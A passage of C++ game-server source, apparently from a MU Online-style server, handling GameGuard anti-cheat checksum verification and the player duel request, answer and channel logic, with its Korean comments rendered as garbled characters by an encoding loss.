		for( int i = 0; i < 8; i++)
		{
			LogAddTD("[NPgg] Recv Checksum Result %x [%s][%s]", 
					dwResults[i], lpObj->AccountID, lpObj->Name);
		}

		GCServerMsgStringSend(lMsg.Get(1201), aIndex, 0);		//"������ �ٽ� ������ ���ð� ��� ���� ������ �߻��ϸ�, "
		GCServerMsgStringSend(lMsg.Get(1202), aIndex, 0);		//"game@inca.co.kr �� GameGuard ������ erl ���ϵ��� ÷���ϰ�, "
		GCServerMsgStringSend(lMsg.Get(1203), aIndex, 0);		//"����ó�� ��� ���Ϸ� �����ֽñ� �ٶ��ϴ�."
		gObjCloseSet(aIndex, CL_EXIT);
	}
	else
	{
		lpObj->m_NPggCheckSumSendTime = GetTickCount();
		LogAddTD("[NPgg] Checksum Clear %x [%s][%s]", 
				 lpMsg->CheckSum, lpObj->AccountID, lpObj->Name);
	}
}

#elif defined NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_20_20050411
void GCNPggSendCheckSum(int aIndex, PGG_AUTH_DATA pggAuthData)
{
	PMSG_NPROTECTGGCHECKSUM pMsg;
	PHeadSetBE((LPBYTE)&pMsg, 0x73, sizeof(pMsg));

	memcpy(&pMsg.m_ggadCheckSum, pggAuthData, sizeof(GG_AUTH_DATA));
	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));	
}

void GCNPggCheckSumRecv(LPPMSG_NPROTECTGGCHECKSUM lpMsg, int aIndex)
{
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( gObjIsConnected(aIndex) == FALSE ) return;

	LogAddTD("[NPgg] Recv Checksum = %x,AuthValue = %x [%s][%s]", 
				 lpMsg->m_ggadCheckSum.dwIndex, lpObj->NPggCSAuth.m_AuthAnswer.dwIndex,
				 lpObj->AccountID, lpObj->Name);

	memcpy(&gObj[aIndex].NPggCSAuth.m_AuthAnswer, &lpMsg->m_ggadCheckSum, sizeof(GG_AUTH_DATA));

	DWORD dwGGErrCode = gObj[aIndex].NPggCSAuth.CheckAuthAnswer();
	if( dwGGErrCode != ERROR_SUCCESS )
	{
	   // �߸��� �������̳� Ʋ�� ���� �� ��Ÿ ���� �߻�.
		LogAddTD("[NPgg] Invalid Checksum Detect Checksum = %x,AuthValue = %x [%s][%s]", 
				 lpMsg->m_ggadCheckSum.dwIndex, lpObj->NPggCSAuth.m_AuthAnswer.dwIndex,
				 lpObj->AccountID, lpObj->Name);

		GCServerMsgStringSend(lMsg.Get(1201), aIndex, 0);		//"������ �ٽ� ������ ���ð� ��� ���� ������ �߻��ϸ�, "
		GCServerMsgStringSend(lMsg.Get(1202), aIndex, 0);		//"game@inca.co.kr �� GameGuard ������ erl ���ϵ��� ÷���ϰ�, "
		GCServerMsgStringSend(lMsg.Get(1203), aIndex, 0);		//"����ó�� ��� ���Ϸ� �����ֽñ� �ٶ��ϴ�."

		CloseClient(aIndex);
	}		
	else
	{
		lpObj->m_NPggCheckSumSendTime = GetTickCount();
		lpObj->m_bSentGGAuth = false;
		LogAddTD("[NPgg] Checksum Clear %x [%s][%s]", 
				 lpMsg->m_ggadCheckSum.dwIndex, lpObj->AccountID, lpObj->Name);
	}
}
#endif // NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_10_20050411 || NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_20_20050411

#ifdef NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_25_20060123
void GCNPggSendCheckSum(int aIndex, PGG_AUTH_DATA25 pggAuthData)
{
	PMSG_NPROTECTGGCHECKSUM pMsg;
	PHeadSetBE((LPBYTE)&pMsg, 0x73, sizeof(pMsg));

	memcpy(&pMsg.m_ggadCheckSum, pggAuthData, sizeof(GG_AUTH_DATA25));
	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));	
}

void GCNPggCheckSumRecv(LPPMSG_NPROTECTGGCHECKSUM lpMsg, int aIndex)
{
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( gObjIsConnected(aIndex) == FALSE ) return;
	
#ifdef MODIFY_GAMEGUARD_NOT_AUTH_MAPSERVER_MOVE_20060513
	if( lpObj->m_bCheckGGAuth == false )
	{
		return;
	}
#endif

	LogAddTD("[NPgg] Recv Checksum = %x,AuthValue = %x [%s][%s]", 
				 lpMsg->m_ggadCheckSum.dwIndex, lpObj->NPggCSAuth.m_AuthAnswer.dwIndex,
				 lpObj->AccountID, lpObj->Name);

	memcpy(&gObj[aIndex].NPggCSAuth.m_AuthAnswer, &lpMsg->m_ggadCheckSum, sizeof(GG_AUTH_DATA25));

	DWORD dwGGErrCode = gObj[aIndex].NPggCSAuth.CheckAuthAnswer();
	if( dwGGErrCode != ERROR_SUCCESS )
	{
	   // �߸��� �������̳� Ʋ�� ���� �� ��Ÿ ���� �߻�.
		LogAddTD("[NPgg] Invalid Checksum Detect Checksum = %x,AuthValue = %x [%s][%s]", 
				 lpMsg->m_ggadCheckSum.dwIndex, lpObj->NPggCSAuth.m_AuthAnswer.dwIndex,
				 lpObj->AccountID, lpObj->Name);

		GCServerMsgStringSend(lMsg.Get(1201), aIndex, 0);		//"������ �ٽ� ������ ���ð� ��� ���� ������ �߻��ϸ�, "
		GCServerMsgStringSend(lMsg.Get(1202), aIndex, 0);		//"game@inca.co.kr �� GameGuard ������ erl ���ϵ��� ÷���ϰ�, "
		GCServerMsgStringSend(lMsg.Get(1203), aIndex, 0);		//"����ó�� ��� ���Ϸ� �����ֽñ� �ٶ��ϴ�."

		CloseClient(aIndex);
	}		
	else
	{
		lpObj->m_NPggCheckSumSendTime = GetTickCount();
		lpObj->m_bSentGGAuth = false;
		if( !lpObj->m_bSentGGAuthAgain )
		{
			lpObj->m_bSentGGAuthAgain = true;
			GCNPggSendCheckSum( aIndex, &lpObj->NPggCSAuth.m_AuthQuery );
		}
		LogAddTD("[NPgg] Checksum Clear %x [%s][%s]", 
				 lpMsg->m_ggadCheckSum.dwIndex, lpObj->AccountID, lpObj->Name);
	}
}
#endif // NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_25_20060123

#ifdef DUEL_SYSTEM_20031028
#ifdef ADD_NEWPVP_PKFIELD

int	OnCGInviteDuel(LPPMSG_REQ_DUEL_INVITE lpMsg, int aIndex)
{
// ������ �߿� ����, ���� ���� ���´�.
#ifdef GAMESERVER_TO_CASTLESIEGESERVER
	return ENEWPVP::E_NOT_DUEL_CSSERVER;
#endif

	int	nResponsor = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	LPOBJECTSTRUCT lpRequester = &gObj[aIndex];

	if (PacketCheckTime(lpRequester) == FALSE) {
		return ENEWPVP::E_LIMIT_PACKETTIME;
	}

	if (nResponsor == aIndex) {
		return ENEWPVP::E_INVITE_MYSELF;
	}

	// "NON-PK ���������� ������ �Ͻ� �� �����ϴ�."
	if (gNonPK) {
		GCServerMsgStringSend(lMsg.Get(1198), aIndex, 1);
		return ENEWPVP::E_NON_PKSERVER;
	}

	/* ���� ��û�� üũ */
	// ����ڰ� �������� �ƴѰ��
	if( gObj[aIndex].CloseType != -1 ) {
		return ENEWPVP::E_CONNECTION_CLOSING;
	}

	if (g_NewPVP.CheckPKPenalty(lpRequester))
	{
		GCServerMsgStringSend(lMsg.Get(1199), aIndex, 1);			// "�����ڴ� ������ ��û�� �� �����ϴ�."
		return ENEWPVP::E_NOT_DUEL_MURDERER;
	}

	/* ���� �ʴ��� üũ */
	if (!gObjIsConnectedEx(nResponsor) ){
		LogAdd("error : %s %d (%d)",__FILE__, __LINE__, nResponsor);
		ENEWPVP::E_INVALID_USER;
	}

	LPOBJECTSTRUCT lpResponsor = &gObj[nResponsor];
	// "�����ڿ��Դ� ������ ��û�� �� �����ϴ�."
	if (g_NewPVP.CheckPKPenalty(lpResponsor))
	{
		// "�����ڿ��Դ� ������ ��û�� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1200), aIndex, 1);
		return ENEWPVP::E_NOT_DUEL_MURDERER;
	}

	// ���� ������ ��û�� ��밡 ���ϴ� ���� �ٸ���.
	CHAR szDuelName[MAX_IDSTRING+1] = {0,};
	CHAR szDuelName2[MAX_IDSTRING+1] = {0,};
	memcpy(szDuelName, lpResponsor->Name, MAX_IDSTRING);	szDuelName[10] = 0;
	memcpy(szDuelName2, lpMsg->szName, MAX_IDSTRING);		szDuelName2[10] = 0;
	if(strcmp(szDuelName, szDuelName2)) {
		// "��û�� ������ �̸��� �޶� ������ ��û�� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1186), aIndex, 1);
		return ENEWPVP::E_FAILED_RESULT;
	}

	// ����� �����ɼ��� �����ִٸ� ������ �� �� ����.
	if (!IsDuelEnable(lpResponsor->m_Index))
	{
		// "���� ��û�� �źεǾ����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1187), aIndex, 1);
		return ENEWPVP::E_FAILED_RESULT;
	}

	// ���� ����� ���̶�� ������û�� �� �� ����.
	if (g_NewPVP.IsGuildWar(lpRequester) ) 
	{
		// "����� �߿��� ������û�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1188), aIndex, 1);
		return ENEWPVP::E_GUILDWAR;
	}
	// ������ ����� ���̶�� ������û�� �� �� ����.
	if ( g_NewPVP.IsGuildWar(lpResponsor) )
	{
		// "��밡 ����� ���̹Ƿ� ������û�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1189), aIndex, 1);
		return ENEWPVP::E_GUILDWAR;
	}

	// ������ ���������� ������û�� �� �� ����.
	if (g_NewPVP.IsSelfDefense(lpRequester) || g_NewPVP.IsSelfDefense(lpResponsor))
	{
		// "����� ��������� �����ϹǷ� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1213), aIndex, 1);
		return ENEWPVP::E_SELFDEFENSE;
	}

	/* �̺�Ʈ�� üũ */
#ifdef CHAOSCASTLE_SYSTEM_20040408
	// ī���� ĳ�� �ȿ����� ������û�� �� �� ����.
#ifndef WORLD_TOURNAMENT_EVENT_SETTING
	if (CHECK_CHAOSCASTLE(lpRequester->MapNumber) || CHECK_CHAOSCASTLE(lpResponsor->MapNumber)) {
		// "ī���� ĳ�� �ȿ����� ���� ��û�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1231), aIndex, 1);
		return ENEWPVP::E_INVALID_MAP;
	}
#endif // WORLD_TOURNAMENT_EVENT_SETTING
#endif // CHAOSCASTLE_SYSTEM_20040408

	if( lpRequester->m_stateEngagePVP == PVP_USER_PLAYING || lpResponsor->m_stateEngagePVP == PVP_USER_PLAYING )
	{
		GCServerMsgStringSend("[PVP Event] Accion no permitida", aIndex, 1);
		return ENEWPVP::E_INVALID_MAP;
	}

// ������������� ������ �Ҽ� ����
#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
	if( CHECK_DEVILSQUARE(lpRequester->MapNumber) || CHECK_DEVILSQUARE(lpResponsor->MapNumber))
	{
		GCServerMsgStringSend(lMsg.Get(1204), aIndex, 1);
		return ENEWPVP::E_INVALID_MAP;
	}
#else
	if( lpRequester->MapNumber == 9 ||lpResponsor->MapNumber == 9 )
	{
		GCServerMsgStringSend(lMsg.Get(1204), aIndex, 1);
		return ENEWPVP::E_INVALID_MAP;
	}
#endif

#ifdef FOR_BLOODCASTLE
	if (CHECK_BLOODCASTLE(lpRequester->MapNumber) || CHECK_BLOODCASTLE(lpResponsor->MapNumber)) {
		// "���� ĳ�� �ȿ����� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1190), aIndex, 1);
		return ENEWPVP::E_INVALID_MAP;
	}
#endif

	// �ڽ��� ��û�ϰų� �ŷ��� �϶� �� ������ �̷�� ���� �ʵ���
	if( lpRequester->m_IfState.use > 0 )
	{
		// "�ŷ� �߿��� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1191), aIndex, 1);
		return ENEWPVP::E_FAILED_RESULT;
	}

	// ��밡 �ٸ����� �ϰ� �������� ������ �̷�� ���� �ʵ��� 
	if( lpResponsor->m_IfState.use > 0 )
	{
		// "%s���� �ŷ� ���̹Ƿ� ������ �� �� �����ϴ�."
		GCServerMsgStringSendEx(aIndex, 1, lMsg.Get(1192), lpResponsor->Name);
		return ENEWPVP::E_FAILED_RESULT;
	}

	int nRet = g_NewPVP.Reserve(*lpRequester, *lpResponsor);
	if (E_FAILED(nRet))
	{
		switch (nRet)
		{
			/* lpRequester */
		case ENEWPVP::E_ALREADY_DUELREQUESTED:
			{
			}
			break;
		case ENEWPVP::E_ALREADY_DUELRESERVED:
			{
				// ������ �̹� ������ ��û�ߴٸ�
				GCServerMsgStringSend(lMsg.Get(1183), aIndex, 1);	// "����� ������ �̹� ������ ��û�߽��ϴ�."
				GCServerMsgStringSend(lMsg.Get(1185), aIndex, 1);	// "������� �ϱ����ؼ� ���� ������ ������ּ���."
			}
			break; 
		case ENEWPVP::E_ALREADY_DUELLING:
			{
				// ������ �̹� ������ �ϰ� �ִٸ�
				GCServerMsgStringSend(lMsg.Get(1184), aIndex, 1);	// "����� �̹� ���� �� �Դϴ�."
				GCServerMsgStringSend(lMsg.Get(1185), aIndex, 1);	// "������� �ϱ����ؼ� ���� ������ ������ּ���."
			}
			break;
			/* lpRequester */

			/* lpResponsor */
		case ENEWPVP::E_ALREADY_DUELREQUESTED_1:
			{
				// ������ ������ �̹� ������û�� �޾Ҵٸ� ������ �̷������ �ʵ���
				// "%s���� �̹� ������û�� �޾����Ƿ� ������ �� �� �����ϴ�."
				GCServerMsgStringSendEx(aIndex, 1, lMsg.Get(1193), lpResponsor->Name);
			}
			break;
		case ENEWPVP::E_ALREADY_DUELRESERVED_1:
			{
				// ��밡 ���� ��û���� �� ������ �̷�� ���� �ʵ���
				// "%s���� ������û ���̹Ƿ� ������ �� �� �����ϴ�."
				GCServerMsgStringSendEx(aIndex, 1, lMsg.Get(1194), lpResponsor->Name);
			}
			break;
		case ENEWPVP::E_ALREADY_DUELLING_1:
			{
				// ��밡 ���� ���� �� ������ �̷�� ���� �ʵ���
				// "%s���� ���� ���̹Ƿ� ������ �� �� �����ϴ�."
				GCServerMsgStringSendEx(aIndex, 1, lMsg.Get(1195), lpResponsor->Name);
			}
			break;
			/* lpResponsor */
		}

		return nRet;
	}

	// ������ ������ ��û�ϴ� ���̶�� �޽����� ������.
	// "%s�Կ��� ������ ��û�߽��ϴ�."
	GCServerMsgStringSendEx(aIndex, 1, lMsg.Get(1196), lpResponsor->Name);

	LogAddTD("[Duel] [%s][%s] Requested to Start Duel to [%s][%s]",
		lpRequester->AccountID,
		lpRequester->Name,
		lpResponsor->AccountID,
		lpResponsor->Name
		);

	return ENEWPVP::E_NO_ERROR;
}

int OnCGAnswerDuel(LPPMSG_ANS_DUEL_ANSWER lpMsg, int aIndex)
{
// ������ �߿� ����, ���� ���� ���´�.
#ifdef GAMESERVER_TO_CASTLESIEGESERVER
	return ENEWPVP::E_NOT_DUEL_CSSERVER;
#endif

	LPOBJECTSTRUCT lpRequester = NULL;
	LPOBJECTSTRUCT lpResponsor = &gObj[aIndex];
	int nRequester = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);

	// ������ ��û�� ������ Ȯ���Ѵ�.
	ERROR_RETURN_INT(gObjIsConnectedEx(nRequester), ENEWPVP::E_DISCONNECT, NULL);
	lpRequester = &gObj[nRequester];

	// Ŭ���̾�Ʈ���� ����� �˷��� ��Ŷ
	PMSG_ANS_DUEL_INVITE res = {0,};
	{
		res.h.c = PMHC_BYTE;
		res.h.size = sizeof(res);
		res.h.headcode = HIBYTE(MSG_DUEL_INVITE);
		res.h.subcode = LOBYTE(MSG_DUEL_INVITE);
		memcpy(res.szName, lpResponsor->Name, MAX_IDSTRING);
	}

	// �������̸�..
	if( lpResponsor->CloseType != -1 )
	{
		g_NewPVP.Cancel(*lpRequester, *lpResponsor);

		res.nResult = ENEWPVP::E_CONNECTION_CLOSING;
		DataSend(nRequester, (LPBYTE)&res, res.h.size);
		return ENEWPVP::E_CONNECTION_CLOSING;
	}

	if (lpMsg->bDuelOK == 0) 
	{
		g_NewPVP.Cancel(*lpRequester, *lpResponsor);
		
		res.nResult = ENEWPVP::E_REFUSE_INVATE;
		DataSend(nRequester, (LPBYTE)&res, res.h.size);
		return ENEWPVP::E_REFUSE_INVATE;
	}


#ifdef CHAOSCASTLE_DUAL_GUILDWAR_CHANGE_20040614
#ifndef WORLD_TOURNAMENT_EVENT_SETTING	
	if (CHECK_BLOODCASTLE(lpRequester->MapNumber) ||		// ����ĳ��
		CHECK_CHAOSCASTLE(lpRequester->MapNumber) ||		// ī����ĳ��
#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
		CHECK_DEVILSQUARE(lpRequester->MapNumber)			// ����������
#else
		lpRequester->MapNumber == 9							// ����������
#endif // DEVILSQUARE_EXTEND_20050221
		)
	{
		g_NewPVP.Cancel(*lpRequester, *lpResponsor);

		// "ī���� ĳ�� �ȿ����� ���� ��û�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(1231), lpResponsor->m_Index, 1);
		GCServerMsgStringSend(lMsg.Get(1231), lpRequester->m_Index, 1);

		res.nResult = ENEWPVP::E_INVALID_MAP;
		DataSend(lpResponsor->m_Index, (LPBYTE)&res, res.h.size);
		DataSend(lpRequester->m_Index, (LPBYTE)&res, res.h.size);

		return ENEWPVP::E_INVALID_MAP;
	}
#endif // WORLD_TOURNAMENT_EVENT_SETTING
#endif // CHAOSCASTLE_DUAL_GUILDWAR_CHANGE_20040614

	int nRet = g_NewPVP.Join(*lpRequester, *lpResponsor);
	if (E_FAILED(nRet))
	{
		switch (nRet)
		{
		case ENEWPVP::E_ALREADY_DUELLING_1:
			{
				// ���� ������ �̹� ������ �ϰ� �ִٸ�
				// "����� �̹� ���� �� �Դϴ�."
				// "������� �ϱ����ؼ� ���� ������ ������ּ���."
				GCServerMsgStringSend(lMsg.Get(1184), aIndex, 1);
				GCServerMsgStringSend(lMsg.Get(1185), aIndex, 1);
			}
			break;
		case ENEWPVP::E_ALREADY_DUELRESERVED_1:
			{
				// ������ �̹� ������ ��û�߾��ٸ�
				// "����� �̹� ������û �� �Դϴ�."
				GCServerMsgStringSend(lMsg.Get(1197), aIndex, 1);
			}
			break;
		case ENEWPVP::E_INVITE_MYSELF:
			break;
		}

		res.nResult = nRet;
		DataSend(lpRequester->m_Index, (LPBYTE)&res, res.h.size);
		DataSend(lpResponsor->m_Index, (LPBYTE)&res, res.h.size);

		g_NewPVP.Cancel(*lpRequester, *lpResponsor);
		return nRet;
	}

	return ENEWPVP::E_NO_ERROR;
}

int OnCGLeaveDuel(LPPMSG_REQ_DUEL_LEAVE lpMsg, int aIndex)
{
#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return ENEWPVP::E_NOT_DUEL_CSSERVER;
#endif
	
	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return ENEWPVP::E_DISCONNECT;
	}

	int nRet = g_NewPVP.Leave(gObj[aIndex]);
	if (E_FAILED(nRet))
		return nRet;

	return ENEWPVP::E_NO_ERROR;
}

int OnDuelChannelJoin(LPPMSG_REQ_DUEL_JOINCNANNEL lpMsg, int aIndex)
{
	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return ENEWPVP::E_DISCONNECT;
	}

	int nRet = g_NewPVP.JoinChannel(lpMsg->nChannelId, gObj[aIndex]);
	if (E_FAILED(nRet))
		return nRet;

	return ENEWPVP::E_NO_ERROR;
}

int OnDuelChannelLeave(LPPMSG_REQ_DUEL_LEAVECNANNEL lpMsg, int aIndex)
{
	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return ENEWPVP::E_DISCONNECT;
	}

	int nRet = g_NewPVP.LeaveChannel(lpMsg->nChannelId, gObj[aIndex]);
	if (E_FAILED(nRet))
		return nRet;
	
	return ENEWPVP::E_NO_ERROR;
}

#else
//----------------------------------------------------------------------------
// [0xAA] ������ �ٸ� ������� ��û�Ѵ�.
void CGDuelStartRequestRecv(LPPMSG_REQ_START_DUEL lpMsg, int aIndex)
{


#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif

	int iDuelIndex = -1;		// ���� ������ ������ �ε���
	char szTempText [256];
	
	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return;
	}

	if (gNonPK) {
		GCServerMsgStringSend(lMsg.Get(1198), aIndex, 1);	// "NON-PK ���������� ������ �Ͻ� �� �����ϴ�."
		return;
	}

#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	if (!gPkLimitFree) {
#endif

#ifdef UPDATE_PK_SYSTEM_20070302	// �����ڴ� ������ ��û�� �� �����ϴ�
	BOOL	PKFlag = FALSE;
	if(gObj[aIndex].PartyNumber >= 0)	// ��Ƽ�� ���Ұ��
	{
		if( gParty.GetPKPartyPenalty(gObj[aIndex].PartyNumber) >= PK_LEVEL_DEFAULT+3)
		{
			PKFlag = TRUE;
		}
	}
	else
	{
		if(gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT+3)
		{
			PKFlag = TRUE;
		}
	}
	
	if(PKFlag == TRUE) {
#else	// UPDATE_PK_SYSTEM_20070302
	if (gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT+3) {
#endif	// UPDATE_PK_SYSTEM_20070302

		GCServerMsgStringSend(lMsg.Get(1199), aIndex, 1);	// "�����ڴ� ������ ��û�� �� �����ϴ�."
		return;
	}
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	}
#endif

	// ������ �̹� ������ ��û�ߴٸ�
	if (CHECK_LIMIT(gObj[aIndex].m_iDuelUserReserved, MAX_OBJECT)) {
		GCServerMsgStringSend(lMsg.Get(1183), aIndex, 1);	// "����� ������ �̹� ������ ��û�߽��ϴ�."
		GCServerMsgStringSend(lMsg.Get(1185), aIndex, 1);	// "������� �ϱ����ؼ� ���� ������ ������ּ���."
		return;
	}

	// ������ �̹� ������ �ϰ� �ִٸ�
	if (CHECK_LIMIT(gObj[aIndex].m_iDuelUser, MAX_OBJECT)) {
		GCServerMsgStringSend(lMsg.Get(1184), aIndex, 1);	// "����� �̹� ���� �� �Դϴ�."
		GCServerMsgStringSend(lMsg.Get(1185), aIndex, 1);	// "������� �ϱ����ؼ� ���� ������ ������ּ���."
		return;
	}

#ifdef CHAOSCASTLE_SYSTEM_20040408		// ī���� ĳ�� �ȿ����� ������û�� �� �� ����.
	#ifndef WORLD_TOURNAMENT_EVENT_SETTING	
		if (CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber)) {
			GCServerMsgStringSend(lMsg.Get(1231), aIndex, 1);	// "ī���� ĳ�� �ȿ����� ���� ��û�� �� �� �����ϴ�."
			return;
		}
	#endif
#endif	
	
	LPOBJECTSTRUCT lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];
	if( PacketCheckTime(lpObj) == FALSE ) return;

	iDuelIndex = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	
	if( !CHECK_LIMIT(iDuelIndex, MAX_OBJECT) )
	{
		LogAdd("error : %s %d (%d)",__FILE__, __LINE__, iDuelIndex);
		return;
	}

	// �ڽ����� ������ ��û�� �� ����.
	if( iDuelIndex == aIndex ) return;

#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	if (!gPkLimitFree) {
#endif
#ifdef UPDATE_PK_SYSTEM_20070302	// �����ڴ� ������ ��û�� �� �����ϴ�
	BOOL	PKFlag = FALSE;
	if(gObj[aIndex].PartyNumber >= 0)	// ��Ƽ�� ���Ұ��
	{
		if( gParty.GetPKPartyPenalty(gObj[aIndex].PartyNumber) >= PK_LEVEL_DEFAULT+3)
		{
			PKFlag = TRUE;
		}
	}
	else
	{
		if(gObj[aIndex].m_PK_Level >= PK_LEVEL_DEFAULT+3)
		{
			PKFlag = TRUE;
		}
	}
	
	if(PKFlag == TRUE) {
#else	// UPDATE_PK_SYSTEM_20070302
	if (gObj[iDuelIndex].m_PK_Level >= PK_LEVEL_DEFAULT+3) {
#endif	// UPDATE_PK_SYSTEM_20070302

		GCServerMsgStringSend(lMsg.Get(1200), aIndex, 1);		// "�����ڿ��Դ� ������ ��û�� �� �����ϴ�."
		return;
	}
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	}
#endif

	// ���� ������ ��û�� ��밡 ���ϴ� ���� �ٸ���.
	CHAR szDuelName[11] = {0,}, szDuelName2[11] = {0,};
	memcpy (szDuelName, gObj[iDuelIndex].Name, MAX_IDSTRING);		szDuelName[10] = 0;
	memcpy (szDuelName2, lpMsg->szName, MAX_IDSTRING);				szDuelName2[10] = 0;

	if(strcmp(szDuelName, szDuelName2)) {
		GCServerMsgStringSend(lMsg.Get(1186), aIndex, 1);		// "��û�� ������ �̸��� �޶� ������ ��û�� �� �����ϴ�."
		return;
	}

	// ����� �����ɼ��� �����ִٸ� ������ �� �� ����.
	if (!IsDuelEnable(iDuelIndex)) {
		GCServerMsgStringSend(lMsg.Get(1187), aIndex, 1);		// "���� ��û�� �źεǾ����ϴ�."
		return;
	}

	// ���� ����� ���̶�� ������û�� �� �� ����.
	if (lpObj->lpGuild && lpObj->lpGuild->WarState == 1) {
		GCServerMsgStringSend(lMsg.Get(1188), aIndex, 1);		// "����� �߿��� ������û�� �� �� �����ϴ�."
		return;
	}

	// ������ ����� ���̶�� ������û�� �� �� ����.
	if (gObj[iDuelIndex].lpGuild && gObj[iDuelIndex].lpGuild->WarState == 1) {
		GCServerMsgStringSend(lMsg.Get(1189), aIndex, 1);		// "��밡 ����� ���̹Ƿ� ������û�� �� �� �����ϴ�."
		return;
	}

	// ���� ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(iDuelIndex) == FALSE ) return;
	if( gObj[iDuelIndex].Type == OBJTYPE_MONSTER ) return;
	if( gObj[iDuelIndex].CloseCount >= 0 ) return;


#ifdef DUEL_SYSTEM_FIX_20031224
	// ������ ���������� ������û�� �� �� ����.
	BOOL bRetVal = FALSE;
	int n;
	for( n=0; n<MAXSELFDEFENSE; n++) {
		// ���� �������� ���ȴٸ� ������û�� �� �� ����.
		if( lpObj->SelfDefense[n] >= 0) {
			bRetVal = TRUE;
			break;
		}
	}
	if (bRetVal) {
		GCServerMsgStringSend(lMsg.Get(1213), aIndex, 1);		// "����� ��������� �����ϹǷ� ������ �� �� �����ϴ�."
		return;
	}
	for( n=0; n<MAXSELFDEFENSE; n++) {
		// ������ �������� ���ȴٸ� ������û�� �� �� ����.
		if( gObj[iDuelIndex].SelfDefense[n] >= 0) {
			bRetVal = TRUE;
			break;
		}
	}
	if (bRetVal) {
		GCServerMsgStringSend(lMsg.Get(1213), aIndex, 1);		// "����� ��������� �����ϹǷ� ������ �� �� �����ϴ�."
		return;
	}
#endif

	if( gObj[iDuelIndex].m_stateEngagePVP == PVP_USER_PLAYING )
	{
		GCServerMsgStringSend("[PVP Event] Accion no permitida", aIndex, 1);
		return;
	}

#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
	if( CHECK_DEVILSQUARE(gObj[iDuelIndex].MapNumber) )
#else
	if( gObj[iDuelIndex].MapNumber == 9 )
#endif
	{	// ������������� ������ �Ҽ� ����
		GCServerMsgStringSend(lMsg.Get(1204), aIndex, 1);
		return;
	}

#ifdef FOR_BLOODCASTLE
	if (CHECK_BLOODCASTLE(gObj[aIndex].MapNumber)) {		
		GCServerMsgStringSend(lMsg.Get(1190), aIndex, 1);		// "���� ĳ�� �ȿ����� ������ �� �� �����ϴ�."
		return;
	}
#endif

	// �ڽ��� ��û�ϰų� �ŷ��� �϶� �� ������ �̷�� ���� �ʵ���
	if( lpObj->m_IfState.use > 0 )
	{
		GCServerMsgStringSend(lMsg.Get(1191), aIndex, 1);		// "�ŷ� �߿��� ������ �� �� �����ϴ�."
		return;
	}

	// ��밡 �ٸ����� �ϰ� �������� ������ �̷�� ���� �ʵ��� 
	if( gObj[iDuelIndex].m_IfState.use > 0 )
	{
		wsprintf(szTempText, lMsg.Get(1192), gObj[iDuelIndex].Name);		// "%s���� �ŷ� ���̹Ƿ� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(szTempText, aIndex, 1);
		return;
	}

	// ������ ������ �̹� ������û�� �޾Ҵٸ� ������ �̷������ �ʵ���
	if( CHECK_LIMIT(gObj[iDuelIndex].m_iDuelUserRequested, MAX_OBJECT)) {
		wsprintf(szTempText, lMsg.Get(1193), gObj[iDuelIndex].Name);		// "%s���� �̹� ������û�� �޾����Ƿ� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(szTempText, aIndex, 1);
		return;
	}

	// ��밡 ���� ��û���� �� ������ �̷�� ���� �ʵ���
	if( CHECK_LIMIT(gObj[iDuelIndex].m_iDuelUserReserved, MAX_OBJECT)) {
		wsprintf(szTempText, lMsg.Get(1194), gObj[iDuelIndex].Name);		// "%s���� ������û ���̹Ƿ� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(szTempText, aIndex, 1);
		return;
	}

	// ��밡 ���� ���� �� ������ �̷�� ���� �ʵ���
	if( CHECK_LIMIT(gObj[iDuelIndex].m_iDuelUser, MAX_OBJECT)) {
		wsprintf(szTempText, lMsg.Get(1195), gObj[iDuelIndex].Name);		// "%s���� ���� ���̹Ƿ� ������ �� �� �����ϴ�."
		GCServerMsgStringSend(szTempText, aIndex, 1);
		return;
	}

	// ���� ���� ��� ������ �����Ѵ�.
	lpObj->m_iDuelUserReserved = iDuelIndex;
	lpObj->m_iDuelUser = -1;

	// ������ ������û �������� �����Ѵ�.
	gObj[iDuelIndex].m_iDuelUserRequested = aIndex;

